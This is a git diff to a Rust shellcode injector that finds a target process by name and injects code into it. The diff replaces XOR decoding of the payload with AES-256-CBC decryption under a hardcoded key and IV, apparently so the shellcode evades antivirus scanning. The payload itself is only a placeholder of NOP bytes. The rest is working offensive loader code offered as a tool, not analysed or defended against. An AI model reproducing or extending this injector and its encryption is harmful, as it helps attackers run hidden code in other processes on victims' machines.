@@ -1,3 +1,4 @@
+use libaes::Cipher;
 use sysinfo::{Pid, ProcessExt, SystemExt};
 
 use std::{
@@ -49,19 +50,15 @@ fn inject_shellcode(process_id: Pid) {
             panic!("Error opening process: {}", status);
         }
 
-        //encoded shellcode goes here
-        let buf : Vec<u8> = vec![0x90];
+        //xor encrypted shellcode goes here.
+        //let xor_shellcode: Vec<u8> = vec![0x90, 0x90, 0x90];
+        //let mut shellcode: Vec<u8> = xor_decode(&encoded_shellcode, 0xDA);
 
-        let mut shellcode : Vec<u8> = Vec::with_capacity(buf.len());
-        for x in &buf {
-            shellcode.push(*x ^ 0xBA);
-        }
-
-        println!("{:?}",shellcode);
+        //aes encrypted shellcode goes here
+        let aes_shellcode: Vec<u8> = vec![0x90, 0x90, 0x90];
+        let mut shellcode: Vec<u8> = aes_256_decrypt(&aes_shellcode, b"ABCDEFGHIJKLMNOPQRSTUVWXYZ-01337", b"This is 16 bytes");
 
         let mut shellcode_length = shellcode.len();
-
-        println!("{}", shellcode_length);
 
         let handle = process_handle as *mut c_void;
         let mut base_address : *mut c_void = null_mut();
@@ -105,3 +102,34 @@ fn get_process_id_by_name(target_process: &str) -> Pid {
 
     return process_id;
 }
+
+/* 
+fn xor_decode(shellcode: &Vec<u8>, key: u8) -> Vec<u8> {
+    shellcode.iter().map(|x| x ^ key).collect()
+}
+*/
+
+fn aes_256_decrypt(shellcode: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
+    // Create a new 128-bit cipher
+    let cipher = Cipher::new_256(key);    
+    
+    //Decryption
+    let decrypted = cipher.cbc_decrypt(iv, &shellcode);
+
+    decrypted
+}
+
+/*
+fn get_input() -> io::Result<()> {
+    let mut buf = String::new();
+    std::io::stdin().read_line(&mut buf)?;
+    Ok(())
+}
+
+/// Used for debugging
+fn pause() {
+    match get_input() {
+        Ok(buffer) => println!("{:?}", buffer),
+        Err(error) => println!("error: {}", error),
+    };
+}*/
